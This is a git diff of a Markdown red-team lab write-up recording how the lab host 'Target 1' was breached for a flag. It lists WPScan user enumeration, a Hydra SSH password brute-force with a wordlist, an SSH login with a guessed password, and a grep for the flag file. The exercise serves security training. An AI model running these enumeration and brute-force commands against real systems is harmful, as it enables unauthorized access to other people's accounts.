@@ -45,8 +45,17 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
     - **Exploit Used**
       - WPScan to enumerate users
-      - wpscan --url 192.168.1.110/wordpress/ --enumerate u
-      - ![WPScan](/Images/WPScan.png)
+        - wpscan --url 192.168.1.110/wordpress/ --enumerate u
+        - ![WPScan](/Images/WPScan.png)
+      - Use Hydra to crack michael's password or guess password
+        - hydra -l michael -P /usr/shar/wordlists/rockyou.txt 192.168.1.110 ssh
+        - ![Hydra](/Images/Hydra.png)
+      - Use stolen credentials to SSH into michael's account
+        - ssh michael@192.168.1.110
+        - Password: michael
+      - Search for Flag1
+        - grep -rnw ./ -e 'flag1' 2>/dev/null
+        - ![flag1](/Images/Flag1.png)
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
